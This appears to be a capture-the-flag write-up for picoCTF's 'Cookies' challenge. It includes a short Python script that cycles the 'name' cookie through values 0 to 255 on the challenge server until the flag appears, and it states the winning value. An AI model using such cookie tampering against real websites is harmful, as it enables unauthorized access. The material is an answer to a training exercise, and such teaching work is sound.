## Description
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:27177/

## Solution
the webpage used a cookie. and if we input any value, it will be checked and if valid will show a response.


this is a sample cookie recieved:
```
auth_name=TE1YOFZTSU0zYWh1VkpjYUVNQTdXVG01clZRbVplb0NWQWdSZ1hPNCsxRUhMQ3FQUEdWdEttaWhXbm1qbW1Ja3JDWVpLWW8vYVlMTVZsazVCZXlkWkpIZHhyMzRpMmFMTUQ2b1Q1dGtuQmQyeGZNQUlaNFpGaGwzdzc5MkM3TXQ=; name=-1
```

the `auth_name` seem to be not usefull, but if we enter a valid cookie name like `snickerdoodle` which is given as hint in placeholder of input, we will a green prompt will be shown and cookie value `name` will be changed.

So we get the idea to get the flag, we should iterate on `name` values and see if we find any `name` value which gives us the flag.


python code for it:
```python

import requests

url = 'http://mercury.picoctf.net:27177/check'

for i in range(256):
	print(f'[+] Index = {i}')
	headers = {
		'Cookie': f'auth_name=TE1YOFZTSU0zYWh1VkpjYUVNQTdXVG01clZRbVplb0NWQWdSZ1hPNCsxRUhMQ3FQUEdWdEttaWhXbm1qbW1Ja3JDWVpLWW8vYVlMTVZsazVCZXlkWkpIZHhyMzRpMmFMTUQ2b1Q1dGtuQmQyeGZNQUlaNFpGaGwzdzc5MkM3TXQ=; name={i}'
	}
	res = requests.get(url, headers=headers)
	content = res.content.decode()
	if "picoCTF" in content:
		print(content)
```

on iteration index=18, will give us the flag.